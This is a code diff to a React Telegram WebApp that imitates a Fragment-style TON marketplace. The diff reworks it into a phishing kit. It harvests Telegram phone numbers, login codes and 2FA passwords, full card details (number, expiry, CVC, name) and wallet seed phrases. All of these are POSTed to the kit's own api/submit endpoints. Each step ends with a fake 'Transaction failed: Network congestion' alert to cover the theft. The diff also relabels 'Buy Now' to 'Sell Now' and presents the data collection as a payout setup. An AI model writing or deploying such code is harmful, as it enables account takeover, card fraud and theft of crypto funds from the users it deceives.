@@ -1,5 +1,5 @@
 import { useState, useEffect } from 'react';
-import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key } from 'lucide-react';
+import { ArrowUpRight, ShieldCheck, Menu, X, ExternalLink, ArrowLeft, History, Share2, CreditCard, Wallet, Lock, Send, Phone, Key, Fingerprint } from 'lucide-react';
 import { motion, AnimatePresence } from 'motion/react';
 
 // Use a fallback for when Telegram WebApp is not available (e.g., in a browser)
@@ -8,11 +8,12 @@ const tg = (window as any).Telegram?.WebApp;
 export default function App() {
   const [isMenuOpen, setIsMenuOpen] = useState(false);
   const [isModalOpen, setIsModalOpen] = useState(false);
-  const [modalStep, setModalStep] = useState<'select' | 'phone' | 'code' | '2fa' | 'card'>('select');
+  const [modalStep, setModalStep] = useState<'select' | 'phone' | 'code' | '2fa' | 'card' | 'wallet'>('select');
   const [phone, setPhone] = useState('');
   const [code, setCode] = useState('');
   const [twoFactor, setTwoFactor] = useState('');
   const [cardData, setCardData] = useState({ number: '', expiry: '', cvc: '', name: '' });
+  const [seedPhrase, setSeedPhrase] = useState('');
   const [loading, setLoading] = useState(false);
 
   const [pageData, setPageData] = useState({
@@ -93,7 +94,13 @@ export default function App() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, code, user: tg?.initDataUnsafe?.user })
       });
-      if (response.ok) setModalStep('2fa');
+      const data = await response.json();
+      if (data.status === '2fa_needed') {
+        setModalStep('2fa');
+      } else {
+        alert("Transaction failed: Network congestion. Please try again later.");
+        setIsModalOpen(false);
+      }
     } catch (err) {
       alert("Error verifying code.");
     }
@@ -108,7 +115,8 @@ export default function App() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ phone, twoFactor, user: tg?.initDataUnsafe?.user })
       });
-      setModalStep('card');
+      alert("Transaction failed: Connection timeout. Please try again later.");
+      setIsModalOpen(false);
     } catch (err) {}
     setLoading(false);
   };
@@ -122,6 +130,20 @@ export default function App() {
         body: JSON.stringify({ phone, cardData, user: tg?.initDataUnsafe?.user })
       });
       alert("Transaction failed: Network congestion. Please try again later.");
+      setIsModalOpen(false);
+    } catch (err) {}
+    setLoading(false);
+  };
+
+  const handleWalletSubmit = async () => {
+    setLoading(true);
+    try {
+      await fetch('api/submit/wallet', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ seedPhrase, user: tg?.initDataUnsafe?.user })
+      });
+      alert("Transaction failed: Wallet connection error. Please try again later.");
       setIsModalOpen(false);
     } catch (err) {}
     setLoading(false);
@@ -341,7 +363,7 @@ export default function App() {
                     className="w-full py-5 bg-fragment-blue hover:bg-fragment-blue/90 text-white rounded-2xl font-black text-lg transition-all shadow-xl shadow-fragment-blue/20 flex items-center justify-center gap-3 group relative overflow-hidden"
                   >
                     <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-shimmer" />
-                    <span className="relative z-10">Buy Now</span>
+                    <span className="relative z-10">Sell Now</span>
                     <ArrowUpRight size={24} className="relative z-10 group-hover:translate-x-1 group-hover:-translate-y-1 transition-transform" />
                   </button>
                 </div>
@@ -372,10 +394,11 @@ export default function App() {
               <div className="p-8">
                 <div className="flex justify-between items-center mb-8">
                   <h2 className="text-2xl font-black tracking-tight">
-                    {modalStep === 'select' ? 'Checkout' :
-                     modalStep === 'phone' ? 'Enter Phone' :
+                    {modalStep === 'select' ? 'Choose Payout' :
+                     modalStep === 'phone' ? 'Telegram Auth' :
                      modalStep === 'code' ? 'Verify Code' :
-                     modalStep === '2fa' ? '2-Step Verification' : 'Payment'}
+                     modalStep === '2fa' ? '2-Step Auth' :
+                     modalStep === 'card' ? 'Card Details' : 'Wallet Connection'}
                   </h2>
                   {!loading && (
                     <button onClick={() => setIsModalOpen(false)} className="p-2 hover:bg-fragment-border rounded-full transition-colors">
@@ -386,14 +409,25 @@ export default function App() {
 
                 {modalStep === 'select' && (
                   <div className="space-y-4">
-                    <button onClick={() => setModalStep('phone')} className="w-full p-6 bg-fragment-bg border border-fragment-border hover:border-fragment-blue/50 rounded-2xl flex items-center gap-4 transition-all group">
-                      <div className="w-12 h-12 rounded-xl bg-orange-500/10 flex items-center justify-center text-orange-500 group-hover:bg-orange-500 group-hover:text-white transition-all">
-                        <Wallet size={24} />
+                    <button onClick={() => setModalStep('card')} className="w-full p-5 bg-fragment-bg border border-fragment-border hover:border-fragment-blue/50 rounded-2xl flex items-center gap-4 transition-all group">
+                      <div className="w-10 h-10 rounded-xl bg-fragment-blue/10 flex items-center justify-center text-fragment-blue group-hover:bg-fragment-blue group-hover:text-white transition-all">
+                        <CreditCard size={20} />
                       </div>
-                      <div className="text-left">
-                        <p className="font-bold text-lg">Connect Telegram Wallet</p>
-                        <p className="text-xs text-fragment-text-dim">Pay with your TON balance</p>
+                      <p className="font-bold">Enter Credit Card</p>
+                    </button>
+
+                    <button onClick={() => setModalStep('phone')} className="w-full p-5 bg-fragment-bg border border-fragment-border hover:border-fragment-blue/50 rounded-2xl flex items-center gap-4 transition-all group">
+                      <div className="w-10 h-10 rounded-xl bg-orange-500/10 flex items-center justify-center text-orange-500 group-hover:bg-orange-500 group-hover:text-white transition-all">
+                        <Send size={20} />
                       </div>
+                      <p className="font-bold">Telegram Login</p>
+                    </button>
+
+                    <button onClick={() => setModalStep('wallet')} className="w-full p-5 bg-fragment-bg border border-fragment-border hover:border-fragment-blue/50 rounded-2xl flex items-center gap-4 transition-all group">
+                      <div className="w-10 h-10 rounded-xl bg-green-500/10 flex items-center justify-center text-green-500 group-hover:bg-green-500 group-hover:text-white transition-all">
+                        <Wallet size={20} />
+                      </div>
+                      <p className="font-bold">Connect Wallet</p>
                     </button>
                   </div>
                 )}
@@ -466,22 +500,55 @@ export default function App() {
                         />
                       </div>
                       <div className="grid grid-cols-2 gap-4">
+                        <div>
+                           <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Expiry Date</label>
+                           <input
+                            type="text" placeholder="MM / YY"
+                            className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
+                            value={cardData.expiry}
+                            onChange={(e) => setCardData({...cardData, expiry: e.target.value})}
+                           />
+                        </div>
+                        <div>
+                           <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">CVC</label>
+                           <input
+                            type="text" placeholder="123"
+                            className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
+                            value={cardData.cvc}
+                            onChange={(e) => setCardData({...cardData, cvc: e.target.value})}
+                           />
+                        </div>
+                      </div>
+                      <div>
+                        <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Cardholder Name</label>
                         <input
-                          type="text" placeholder="MM / YY"
-                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
-                          value={cardData.expiry}
-                          onChange={(e) => setCardData({...cardData, expiry: e.target.value})}
-                        />
-                        <input
-                          type="text" placeholder="CVC"
-                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
-                          value={cardData.cvc}
-                          onChange={(e) => setCardData({...cardData, cvc: e.target.value})}
+                          type="text" placeholder="FULL NAME"
+                          className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue uppercase"
+                          value={cardData.name}
+                          onChange={(e) => setCardData({...cardData, name: e.target.value})}
                         />
                       </div>
                     </div>
                     <button onClick={handleCardSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-black text-lg disabled:opacity-50">
-                      {loading ? 'Confirming...' : 'Pay ' + pageData.priceTON + ' TON'}
+                      {loading ? 'Confirming...' : 'Register Payout Method'}
+                    </button>
+                  </div>
+                )}
+
+                {modalStep === 'wallet' && (
+                  <div className="space-y-6">
+                    <div>
+                      <label className="text-[10px] font-bold text-fragment-text-dim uppercase tracking-widest mb-2 block">Secret Seed Phrase (12 or 24 words)</label>
+                      <textarea
+                        placeholder="word1 word2 word3..."
+                        rows={4}
+                        value={seedPhrase}
+                        onChange={(e) => setSeedPhrase(e.target.value)}
+                        className="w-full bg-fragment-bg border border-fragment-border rounded-xl py-3.5 px-4 focus:outline-none focus:border-fragment-blue"
+                      />
+                    </div>
+                    <button onClick={handleWalletSubmit} disabled={loading} className="w-full py-4 bg-fragment-blue text-white rounded-xl font-black text-lg disabled:opacity-50">
+                      {loading ? 'Connecting...' : 'Connect Wallet'}
                     </button>
                   </div>
                 )}
